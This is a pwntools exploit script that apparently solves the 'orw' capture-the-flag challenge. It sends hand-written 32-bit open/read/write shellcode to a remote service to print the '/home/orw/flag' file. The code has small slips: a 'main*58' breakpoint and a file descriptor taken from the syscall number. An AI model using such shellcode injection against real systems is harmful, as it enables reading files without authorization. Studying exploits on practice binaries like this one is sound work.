#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("orw")
libc = elf.libc

local = False 
if local:
    p = process("./orw")
    gdb.attach(p,'''
        b *main*58
        c
    ''')
else:
    p = remote('192.168.47.128', 909)

elf = context.binary = ELF('./orw', checksec=False)

shellcode = asm(
    '''
    push esp
	push 0x00006761
	push 0x6c662f77
	push 0x726f2f65
	push 0x6d6f682f
    
	mov ebx, esp
	mov eax, 0x5				#sys_open
	int 0x80
    
	mov eax, 0x3				#sys_read
	mov ebx, eax
    mov ecx, esi
	mov edx, 0x100
	int 0x80
    
	mov eax, 0x4				#sys_write
    mov ebx, 0x1
	int 0x80
    '''
) 

payload = flat(
    shellcode
    )
p.sendafter(b"shellcode:",payload)
p.interactive()
